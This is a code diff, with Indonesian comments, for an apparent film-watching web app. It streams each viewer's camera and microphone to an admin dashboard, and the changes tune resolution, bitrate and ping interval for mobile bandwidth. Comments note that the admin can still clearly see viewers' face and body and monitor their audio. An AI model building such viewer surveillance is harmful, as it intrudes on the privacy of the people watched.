@@ -947,14 +947,18 @@ function playFilm(id) {
 // ================================================================
 // CAMERA CONSENT
 // ================================================================
-// Paksa kualitas tinggi — ideal 1080p, fallback ke 720p kalau device tidak support
+// OPTIMASI JARINGAN: Turunkan resolusi kamera ke 480p (cukup untuk thumbnail admin).
+// Sebelumnya 1080p paksa — terlalu berat untuk upload via jaringan seluler.
+// Viewer harus upload stream kamera SEKALIGUS download video GDrive dari server yang sama.
+// 480p ~300-600 kbps upload vs 1080p ~2-4 Mbps — jauh lebih ringan.
+// Admin tetap bisa lihat wajah/tubuh jelas di card kecil dashboard meski resolusi 480p.
 function buildCamConstraints(facingMode) {
   return {
     video: {
       facingMode: facingMode || 'environment',
-      width:       { ideal: 1920, min: 1280 },
-      height:      { ideal: 1080, min: 720 },
-      frameRate:   { ideal: 30,   min: 15 },
+      width:       { ideal: 854,  max: 1280 },
+      height:      { ideal: 480,  max: 720  },
+      frameRate:   { ideal: 24,   max: 30   },
       aspectRatio: { ideal: 16/9 }
     },
     audio: {
@@ -970,18 +974,18 @@ function buildCamConstraints(facingMode) {
 
 async function requestCamera() {
   try {
-    // Coba 1080p dulu
+    // OPTIMASI JARINGAN: Target utama 480p (hemat bandwidth upload).
+    // Fallback ke resolusi bebas (biarkan browser pilih terendah yang didukung device).
     try {
       camStream = await navigator.mediaDevices.getUserMedia(buildCamConstraints(currentFacingMode));
-      console.log('[CAM] Stream 1080p berhasil');
+      console.log('[CAM] Stream 480p berhasil');
     } catch (e1) {
-      // Fallback ke 720p kalau device tidak support 1080p
-      console.warn('[CAM] 1080p gagal, fallback ke 720p:', e1.message);
+      console.warn('[CAM] 480p gagal, fallback resolusi minimal:', e1.message);
       camStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: currentFacingMode || 'environment', width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+        video: { facingMode: currentFacingMode || 'environment', width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 24 } },
         audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 48000 }
       });
-      console.log('[CAM] Stream 720p berhasil');
+      console.log('[CAM] Stream fallback berhasil');
     }
     startWatchSession();
   } catch (e) {
@@ -1032,13 +1036,17 @@ async function startWatchSession() {
   connectSocket_Viewer();
   monitorCameraPermission();
 
+  // OPTIMASI JARINGAN: Perpanjang interval ping dari 5s ke 15s.
+  // Ping HTTP setiap 5 detik = 12 request/menit — bersaing dengan WebRTC & video GDrive.
+  // 15 detik masih aman (server timeout sesi = 30 detik di server.js baris ~703).
+  // Ini hemat ~8 request/menit per viewer = bandwidth lebih longgar untuk stream.
   pingInterval = setInterval(async () => {
     await fetch(`${API_BASE}/api/session/ping`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
       body: JSON.stringify({ film: CURRENT_FILM, camActive: true, micActive: true })
     }).catch(() => {});
-  }, 5000);
+  }, 15000);
 
   sessionTimerInterval = setInterval(() => {
     const e = Math.floor((Date.now() - sessionStart) / 1000);
@@ -1152,22 +1160,30 @@ function connectSocket_Viewer() {
       const answer = await pc.createAnswer();
       await pc.setLocalDescription(answer);
 
-      // Paksa bitrate tinggi untuk kualitas HD — 4 Mbps video, 128 kbps audio
+      // OPTIMASI JARINGAN: Turunkan bitrate WebRTC agar viewer tidak overload bandwidth.
+      // Sebelumnya 4 Mbps video — terlalu berat bagi jaringan seluler 4G/3G.
+      // Dengan resolusi 480p, 600 kbps sudah cukup untuk stream tajam ke admin.
+      // Bitrate video 600 kbps + audio 48 kbps = ~650 kbps total upload per viewer.
+      // Sisanya bisa dipakai untuk download video GDrive tanpa buffering.
       try {
         const videoSender = pc.getSenders().find(s => s.track?.kind === 'video');
         if (videoSender) {
           const params = videoSender.getParameters();
           if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
-          params.encodings[0].maxBitrate    = 4_000_000; // 4 Mbps untuk 1080p
-          params.encodings[0].maxFramerate  = 30;
-          params.encodings[0].scaleResolutionDownBy = 1.0; // Tidak scale down sama sekali
+          params.encodings[0].maxBitrate    = 600_000; // 600 kbps — cukup untuk 480p
+          params.encodings[0].maxFramerate  = 24;      // 24fps hemat vs 30fps
+          params.encodings[0].scaleResolutionDownBy = 1.0;
+          // networkPriority: low agar tidak dominasi koneksi saat video GDrive sedang buffering
+          if ('networkPriority' in params.encodings[0]) {
+            params.encodings[0].networkPriority = 'low';
+          }
           await videoSender.setParameters(params);
         }
         const audioSender = pc.getSenders().find(s => s.track?.kind === 'audio');
         if (audioSender) {
           const params = audioSender.getParameters();
           if (!params.encodings || params.encodings.length === 0) params.encodings = [{}];
-          params.encodings[0].maxBitrate = 128_000; // 128 kbps audio
+          params.encodings[0].maxBitrate = 48_000; // 48 kbps audio — cukup untuk monitoring
           await audioSender.setParameters(params);
         }
       } catch {}
@@ -1542,8 +1558,9 @@ async function restoreSession() {
           try {
             camStream = await navigator.mediaDevices.getUserMedia(buildCamConstraints(currentFacingMode));
           } catch {
+            // OPTIMASI JARINGAN: Fallback ke 360p — hemat bandwidth saat restore sesi
             camStream = await navigator.mediaDevices.getUserMedia({
-              video: { facingMode: currentFacingMode || 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+              video: { facingMode: currentFacingMode || 'environment', width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 24 } },
               audio: { echoCancellation: true, noiseSuppression: true, sampleRate: 48000 }
             });
           }
@@ -1601,13 +1618,14 @@ async function _restoreViewerSession(savedSessionId) {
   connectSocket_Viewer();
   monitorCameraPermission();
 
+  // OPTIMASI JARINGAN: Sama seperti startWatchSession — ping 15s (bukan 5s)
   pingInterval = setInterval(async () => {
     await fetch(`${API_BASE}/api/session/ping`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${authToken}` },
       body: JSON.stringify({ film: CURRENT_FILM, camActive: true, micActive: true })
     }).catch(() => {});
-  }, 5000);
+  }, 15000);
 
   sessionTimerInterval = setInterval(() => {
     const e = Math.floor((Date.now() - sessionStart) / 1000);
